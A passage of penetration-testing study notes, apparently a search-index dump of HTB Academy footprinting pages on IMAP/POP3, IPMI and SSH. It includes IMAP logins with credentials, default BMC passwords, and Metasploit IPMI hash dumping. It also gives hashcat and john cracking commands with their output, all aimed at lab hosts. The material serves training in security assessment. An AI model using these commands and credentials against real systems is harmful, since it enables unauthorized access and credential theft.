7a 47 46 ec 4.ck.q...i.8zGF. 0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21 g....1X.OW0j..:! 00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d T....t........T} 00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62 F.3.]$.. cC...Mb Start Time: 1632081604 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: no Max Early Data: 0 --- read R BLOCK * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] twttr IMAP4 v.0.21.4 Once we have successfully initiated a connection and logged in to the target mail server, we can use the above commands to work with and navigate the server.","title":"IMAP/POP3"},{"location":"footprinting/imap_pop3/#imap-commands","text":"Command Description 1 LOGIN username password User's login. 1 LIST \"\" * Lists all directories. 1 CREATE \"INBOX\" Creates a mailbox with a specified name. 1 DELETE \"INBOX\" Deletes a mailbox. 1 RENAME \"ToRead\" \"Important\" Renames a mailbox. 1 LSUB \"\" * Returns a subset of names from the set of names that the User has declared as being active or subscribed . 1 SELECT INBOX Selects a mailbox so that messages in the mailbox can be accessed. 1 UNSELECT INBOX Exits the selected mailbox. 1 FETCH <ID> all Retrieves data associated with a message in the mailbox. 1 FETCH (UID 1 RFC822.SIZE 167 BODY[] {167} Retrieves data associated with a message in the mailbox. 1 CLOSE Removes all messages with the Deleted flag set. 1 LOGOUT Closes the connection with the IMAP server.","title":"Imap Commands"},{"location":"footprinting/imap_pop3/#pop3-commands","text":"Command Description USER username Identifies the user. PASS password Authentication of the user using its password. STAT Requests the number of saved emails from the server. LIST Requests from the server the number and size of all emails. RETR id Requests the server to deliver the requested email by ID. DELE id Requests the server to delete the requested email by ID. CAPA Requests the server to display the server capabilities. RSET Requests the server to reset the transmitted information. QUIT Closes the connection with the POP3 server.","title":"POP3 Commands"},{"location":"footprinting/imap_pop3/#dangerous-settings","text":"Setting Description auth_debug Enables all authentication debug logging. auth_debug_passwords This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. auth_verbose Logs unsuccessful authentication attempts and their reasons. auth_verbose_passwords Passwords used for authentication are logged and can also be truncated. auth_anonymous_username This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.","title":"Dangerous Settings"},{"location":"footprinting/imap_pop3/#footprinting-the-service","text":"By default, ports 110 , 143 , 993 , and 995 are used for IMAP and POP3. The two higher ports use TLS/SSL to encrypt the communication between client and server. hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -sV -p110,143,993,995 -sC Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 22:09 CEST Nmap scan report for 10.129.14.128 Host is up (0.00026s latency). PORT STATE SERVICE VERSION 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING | ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US | Not valid before: 2021-09-19T19:44:58 |_Not valid after: 2295-07-04T19:44:58 143/tcp open imap Dovecot imapd |_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1 | ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US | Not valid before: 2021-09-19T19:44:58 |_Not valid after: 2295-07-04T19:44:58 993/tcp open ssl/imap Dovecot imapd |_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1 | ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US | Not valid before: 2021-09-19T19:44:58 |_Not valid after: 2295-07-04T19:44:58 995/tcp open ssl/pop3 Dovecot pop3d |_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING | ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US | Not valid before: 2021-09-19T19:44:58 |_Not valid after: 2295-07-04T19:44:58 MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds We can see that the common name is mail1.inlanefreight.htb , and the email server belongs to the organization Inlanefreight , which is located in California. If we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages. hrmns@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd * LIST (\\HasNoChildren) \".\" Important * LIST (\\HasNoChildren) \".\" INBOX verbose ( -v ) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server. hrmns@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v * Trying 10.129.14.128:993... * TCP_NODELAY set * Connected to 10.129.14.128 (10.129.14.128) port 993 (#0) * successfully set certificate verify locations: * CAfile: /etc/ssl/certs/ca-certificates.crt CApath: /etc/ssl/certs * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 * Server certificate: * subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb * start date: Sep 19 19:44:58 2021 GMT * expire date: Jul 4 19:44:58 2295 GMT * issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb * SSL certificate verify result: self signed certificate (18), continuing anyway. * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * old SSL session ID is stale, removing < * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4 > A001 CAPABILITY < * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN < A001 OK Pre-login capabilities listed, post-login capabilities have more. > A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ= < * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE < A002 OK Logged in > A003 LIST \"\" * < * LIST (\\HasNoChildren) \".\" Important * LIST (\\HasNoChildren) \".\" Important < * LIST (\\HasNoChildren) \".\" INBOX * LIST (\\HasNoChildren) \".\" INBOX < A003 OK List completed (0.001 + 0.000 secs). * Connection #0 to host 10.129.14.128 left intact To interact with the IMAP or POP3 server over SSL, we can use openssl , as well as ncat . OpenSSL - TLS Encrypted Interaction POP3 hrmns@htb[/htb]$ openssl s_client -connect 10 .129.14.128:pop3s CONNECTED(00000003) Can't use SSL_get_servername depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb verify error:num=18:self signed certificate verify return:1 depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb verify return:1 --- Certificate chain 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb ...SNIP... --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 3CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2 Session-ID-ctx: Resumption PSK: 68419D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - d7 86 ac 7e f3 f4 95 35-88 40 a5 b5 d6 a6 41 e4 ...~...5.@....A. 0010 - 96 6c e6 12 4f 50 ce 72-36 25 df e1 72 d9 23 94 .l..OP.r6%..r.#. 0020 - cc 29 90 08 58 1b 57 ab-db a8 6b f7 8f 31 5b ad .)..X.W...k..1[. 0030 - 47 94 f4 67 58 1f 96 d9-ca ca 56 f9 7a 12 f6 6d G..gX.....V.z..m 0040 - 43 b9 b6 68 de db b2 47-4f 9f 48 14 40 45 8f 89 C..h...GO.H.@E.. 0050 - fa 19 35 9c 6d 3c a1 46-5c a2 65 ab 87 a4 fd 5e ..5.m<.F\\.e....^ 0060 - a2 95 25 d4 43 b8 71 70-40 6c fe 6f 0e d1 a0 38 ..%.C.qp@l.o...8 0070 - 6e bd 73 91 ed 05 89 83-f5 3e d9 2a e0 2e 96 f8 n.s......>.*.... 0080 - 99 f0 50 15 e0 1b 66 db-7c 9f 10 80 4a a1 8b 24 ..P...f.|...J..$ 0090 - bb 00 03 d4 93 2b d9 95-64 44 5b c2 6b 2e 01 b5 .....+..dD[.k... 00a0 - e8 1b f4 a4 98 a7 7a 7d-0a 80 cc 0a ad fe 6e b3 ......z}......n. 00b0 - 0a d6 50 5d fd 9a b4 5c-28 a4 c9 36 e4 7d 2a 1e ..P]...\\(..6.}*. Start Time: 1632081313 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: no Max Early Data: 0 --- read R BLOCK +OK twttr POP3 Server OpenSSL - TLS Encrypted Interaction IMAP hrmns@htb[/htb]$ openssl s_client -connect 10 .129.14.128:imaps CONNECTED(00000003) Can't use SSL_get_servername depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb verify error:num=18:self signed certificate verify return:1 depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb verify return:1 --- Certificate chain 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb ...SNIP... --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699 Session-ID-ctx: Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24 h;.h...|......r$ 0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d b....$...E`&..J} 0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d .n.....A..I..6@. 0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29 .5........?.R..) 0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb ....F..2H...F6.. 0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0 5yTLW..U..Y.^d.. 0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01 .....G.Y...T.... 0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12 V...;..t..f.l(.. 0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 7a 47 46 ec 4.ck.q...i.8zGF. 0090 - 67 b7 a2 90 8b 31 58 a0-4f 57 30 6a b6 2e 3a 21 g....1X.OW0j..:! 00a0 - 54 c7 ba f0 a9 74 13 11-d5 d1 ec cc ea f9 54 7d T....t........T} 00b0 - 46 a6 33 ed 5d 24 ed b0-20 63 43 d8 8f 14 4d 62 F.3.]$.. cC...Mb Start Time: 1632081604 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: no Max Early Data: 0 --- read R BLOCK * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] twttr IMAP4 v.0.21.4 Once we have successfully initiated a connection and logged in to the target mail server, we can use the above commands to work with and navigate the server.","title":"Footprinting the Service"},{"location":"footprinting/ipmi/","text":"Intelligent Platform Management Interface ( IPMI ) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. Footprinting the Service \u00b6 IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH. hrmns@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT Nmap scan report for ilo.inlanfreight.local (172.16.2.2) Host is up (0.00064s latency). PORT STATE SERVICE 623/udp open asf-rmcp | ipmi-version: | Version: | IPMI-2.0 | UserAuth: | PassAuth: auth_user, non_null_user |_ Level: 2.0 MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise) Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol. We can also use the Metasploit scanner module IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version) msf6 > use auxiliary/scanner/ipmi/ipmi_version msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195 msf6 auxiliary(scanner/ipmi/ipmi_version) > show options Module options (auxiliary/scanner/ipmi/ipmi_version): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS 10.129.42.195 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads msf6 auxiliary(scanner/ipmi/ipmi_version) > run [*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts) [+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords include: Product Username Password Dell iDRAC root calvin HP iLO Administrator randomized 8-character string consisting of numbers and uppercase letters Supermicro IPMI ADMIN ADMIN It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet. Dangerous Settings \u00b6 If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300 . In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u which tries all combinations of upper case letters and numbers for an eight-character password. To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module. msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options Module options (auxiliary/scanner/ipmi/ipmi_dumphashes): Name Current Setting Required Description ---- --------------- -------- ----------- CRACK_COMMON true yes Automatically crack common passwords as they are obtained OUTPUT_HASHCAT_FILE no Save captured password hashes in hashcat format OUTPUT_JOHN_FILE no Save captured password hashes in john the ripper format PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt yes File containing common passwords for offline cracking, one per line RHOSTS 10.129.42.195 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 623 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt yes File containing usernames, one per line msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed We have successfully obtained the password hash for the user ADMIN , and the tool was able to quickly crack it to reveal what appears to be a default password ADMIN . From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing. Cracking with John ( true being the hashdump file from metasploit) $ cat true 10.129.202.5 admin:$rakp$acb7c1bb82040000b34cd63433dcdc0bae326d5b80f48e04a1502ec990d05f4a42f2514a943ececba123456789abcdefa123456789abcdef140561646d696e$e06ce138ae580d96f1f287e2775af26db58e5c8f \u250c\u2500\u2500(kali\u327fkali)-[~] \u2514\u2500$ john --format=rakp true Using default input encoding: UTF-8 Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x]) Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst trinity (10.129.202.5 admin) 1g 0:00:00:00 DONE 2/3 (2021-12-28 06:38) 25.00g/s 345475p/s 345475c/s 345475C/s keller..222222 Use the \"--show\" option to display all of the cracked passwords reliably Session completed.","title":"IPMI"},{"location":"footprinting/ipmi/#footprinting-the-service","text":"IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH. hrmns@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT Nmap scan report for ilo.inlanfreight.local (172.16.2.2) Host is up (0.00064s latency). PORT STATE SERVICE 623/udp open asf-rmcp | ipmi-version: | Version: | IPMI-2.0 | UserAuth: | PassAuth: auth_user, non_null_user |_ Level: 2.0 MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise) Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds IPMI protocol is indeed listening on port 623, and Nmap has fingerprinted version 2.0 of the protocol. We can also use the Metasploit scanner module IPMI Information Discovery (auxiliary/scanner/ipmi/ipmi_version) msf6 > use auxiliary/scanner/ipmi/ipmi_version msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195 msf6 auxiliary(scanner/ipmi/ipmi_version) > show options Module options (auxiliary/scanner/ipmi/ipmi_version): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS 10.129.42.195 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 623 yes The target port (UDP) THREADS 10 yes The number of concurrent threads msf6 auxiliary(scanner/ipmi/ipmi_version) > run [*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts) [+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords include: Product Username Password Dell iDRAC root calvin HP iLO Administrator randomized 8-character string consisting of numbers and uppercase letters Supermicro IPMI ADMIN ADMIN It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.","title":"Footprinting the Service"},{"location":"footprinting/ipmi/#dangerous-settings","text":"If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300 . In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u which tries all combinations of upper case letters and numbers for an eight-character password. To retrieve IPMI hashes, we can use the Metasploit IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval module. msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options Module options (auxiliary/scanner/ipmi/ipmi_dumphashes): Name Current Setting Required Description ---- --------------- -------- ----------- CRACK_COMMON true yes Automatically crack common passwords as they are obtained OUTPUT_HASHCAT_FILE no Save captured password hashes in hashcat format OUTPUT_JOHN_FILE no Save captured password hashes in john the ripper format PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt yes File containing common passwords for offline cracking, one per line RHOSTS 10.129.42.195 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 623 yes The target port THREADS 1 yes The number of concurrent threads (max one per host) USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt yes File containing usernames, one per line msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed We have successfully obtained the password hash for the user ADMIN , and the tool was able to quickly crack it to reveal what appears to be a default password ADMIN . From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing. Cracking with John ( true being the hashdump file from metasploit) $ cat true 10.129.202.5 admin:$rakp$acb7c1bb82040000b34cd63433dcdc0bae326d5b80f48e04a1502ec990d05f4a42f2514a943ececba123456789abcdefa123456789abcdef140561646d696e$e06ce138ae580d96f1f287e2775af26db58e5c8f \u250c\u2500\u2500(kali\u327fkali)-[~] \u2514\u2500$ john --format=rakp true Using default input encoding: UTF-8 Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x]) Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst trinity (10.129.202.5 admin) 1g 0:00:00:00 DONE 2/3 (2021-12-28 06:38) 25.00g/s 345475p/s 345475c/s 345475C/s keller..222222 Use the \"--show\" option to display all of the cracked passwords reliably Session completed.","title":"Dangerous Settings"},{"location":"footprinting/linux_remote_management_protocol/","text":"Secure Shell ( SSH ) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port TCP 22 . OpenSSH has six different authentication methods: Password authentication Public-key authentication Host-based authentication Keyboard authentication Challenge-response authentication GSSAPI authentication More info about authentication methods Default Configuration \u00b6 The sshd_config file, responsible for the OpenSSH server, has only a few of the settings configured by default. hrmns@htb[/htb]$ cat /etc/ssh/sshd_config | grep -v \"#\" | sed -r '/^\\s*$/d' Include /etc/ssh/sshd_config.d/*.conf ChallengeResponseAuthentication no UsePAM yes X11Forwarding yes PrintMotd no AcceptEnv LANG LC_* Subsystem sftp /usr/lib/openssh/sftp-server Dangerous Settings \u00b6 Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Setting Description PasswordAuthentication yes Allows password-based authentication. PermitEmptyPasswords yes Allows the use of empty passwords. PermitRootLogin yes Allows to log in as the root user. Protocol 1 Uses an outdated version of encryption. X11Forwarding yes Allows X11 forwarding for GUI applications. AllowTcpForwarding yes Allows forwarding of TCP ports. PermitTunnel Allows tunneling. DebianBanner yes Displays a specific banner when logging in. Footprinting the Service \u00b6 One of the tools we can use to fingerprint the SSH server is ssh-audit . It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. hrmns@htb[/htb]$ git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit hrmns@htb[/htb]$ ./ssh-audit.py 10 .129.14.132 # general (gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3 (gen) software: OpenSSH 8.2p1 (gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+ (gen) compression: enabled (zlib@openssh.com) # key exchange algorithms (kex) curve25519-sha256 -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76 (kex) curve25519-sha256@libssh.org -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp256 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp384 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (kex) ecdh-sha2-nistp521 -- [fail] using weak elliptic curves `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available since OpenSSH 4.4 (kex) diffie-hellman-group16-sha512 -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73 (kex) diffie-hellman-group18-sha512 -- [info] available since OpenSSH 7.3 (kex) diffie-hellman-group14-sha256 -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73 # host-key algorithms (key) rsa-sha2-512 (3072-bit) -- [info] available since OpenSSH 7.2 (key) rsa-sha2-256 (3072-bit) -- [info] available since OpenSSH 7.2 (key) ssh-rsa (3072-bit) -- [fail] using weak hashing algorithm `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28 `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2 (key) ecdsa-sha2-nistp256 -- [fail] using weak elliptic curves `- [warn] using weak random number generator could reveal the key `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62 (key) ssh-ed25519 -- [info] available since OpenSSH 6.5 ...SNIP... The first thing we can see in the first few lines of the output is the banner that reveals the version of the OpenSSH server. The previous versions had some vulnerabilities, such as CVE-2020-14145 , which allowed the attacker the capability to Man-In-The-Middle and attack the initial connection attempt. The detailed output of the connection setup with the OpenSSH server can also often provide important information, such as which authentication methods the server can use. Change 